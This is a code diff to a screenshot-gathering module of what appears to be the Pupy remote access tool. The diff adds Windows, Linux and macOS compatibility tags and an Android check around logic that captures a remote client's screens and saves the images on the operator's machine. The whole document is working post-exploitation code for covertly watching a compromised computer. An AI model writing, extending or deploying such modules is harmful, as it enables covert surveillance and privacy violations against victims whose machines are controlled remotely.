@@ -40,7 +40,7 @@ import subprocess
 __class_name__="Screenshoter"
 
 
-@config(cat="gather")
+@config(cat="gather",compatibilities=['windows', 'linux', 'darwin'])
 class Screenshoter(PupyModule):
     """ take a screenshot :) """
 
@@ -54,33 +54,36 @@ class Screenshoter(PupyModule):
 
     def run(self, args):
         rscreenshot = self.client.conn.modules['screenshot']
-        if args.enum:
-            self.rawlog('{:>2} {:>9} {:>9}\n'.format('IDX', 'SIZE', 'LEFT'))
-            for i, screen in enumerate(rscreenshot.screens()):
-                if not (screen['width'] and screen['height']):
-                    continue
-
-                self.rawlog('{:>2}: {:>9} {:>9}\n'.format(
-                    i,
-                    '{}x{}'.format(screen['width'], screen['height']),
-                    '({}x{})'.format(screen['top'], screen['left'])))
-            return
-
-        config = self.client.pupsrv.config or PupyConfig()
-        folder = config.get_folder('screenshots', {'%c': self.client.short_name()})
-
-        screenshots, error = rscreenshot.screenshot(args.screen)
-        if not screenshots:
-            self.error(error)
+        if self.client.is_android()==True:
+            self.error("Android target, not implemented yet...")
         else:
-            self.success('number of monitor detected: %s' % str(len(screenshots)))
+            if args.enum:
+                self.rawlog('{:>2} {:>9} {:>9}\n'.format('IDX', 'SIZE', 'LEFT'))
+                for i, screen in enumerate(rscreenshot.screens()):
+                    if not (screen['width'] and screen['height']):
+                        continue
 
-            for i, screenshot in enumerate(screenshots):
-                filepath = path.join(folder, str(datetime.datetime.now()).replace(" ","_").replace(":","-")+'-'+str(i)+".png")
-                with open(filepath, 'w') as out:
-                    out.write(screenshot)
-                    self.success(filepath)
+                    self.rawlog('{:>2}: {:>9} {:>9}\n'.format(
+                        i,
+                        '{}x{}'.format(screen['width'], screen['height']),
+                        '({}x{})'.format(screen['top'], screen['left'])))
+                return
 
-                if args.view:
-                    viewer = config.get('default_viewers', 'image_viewer')
-                    subprocess.Popen([viewer, filepath])
+            config = self.client.pupsrv.config or PupyConfig()
+            folder = config.get_folder('screenshots', {'%c': self.client.short_name()})
+
+            screenshots, error = rscreenshot.screenshot(args.screen)
+            if not screenshots:
+                self.error(error)
+            else:
+                self.success('number of monitor detected: %s' % str(len(screenshots)))
+
+                for i, screenshot in enumerate(screenshots):
+                    filepath = path.join(folder, str(datetime.datetime.now()).replace(" ","_").replace(":","-")+'-'+str(i)+".png")
+                    with open(filepath, 'w') as out:
+                        out.write(screenshot)
+                        self.success(filepath)
+
+                    if args.view:
+                        viewer = config.get('default_viewers', 'image_viewer')
+                        subprocess.Popen([viewer, filepath])
